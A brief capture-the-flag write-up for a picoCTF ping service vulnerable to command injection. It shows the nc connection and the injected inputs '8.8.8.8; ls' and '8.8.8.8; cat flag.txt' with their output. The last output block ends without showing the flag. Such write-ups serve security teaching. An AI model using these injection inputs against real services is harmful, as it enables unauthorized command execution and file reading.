Challenge Description

The service asks for an IP address to ping, claiming to only allow "8.8.8.8" due to "tight security." However, it's vulnerable to command injection.
Step-by-Step Solution

    Initial Connection
    bash

nc mysterious-sea.picoctf.net 64615

The service prompts: Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'):

Testing for Command Injection
First, test if command injection is possible by trying to list directory contents:
bash

8.8.8.8; ls

Output:
text

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=8.50 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=8.49 ms
--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 8.493/8.498/8.503/0.005 ms
flag.txt
script.sh

The ; ls after the ping output confirms command injection works, revealing flag.txt and script.sh.

Retrieving the Flag
Read the flag file using the same technique:
bash

8.8.8.8; cat flag.txt

Output:
text

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=8.52 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=8.51 ms
--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 8.510/8.513/8.517/0.003 ms

It should print the flag .
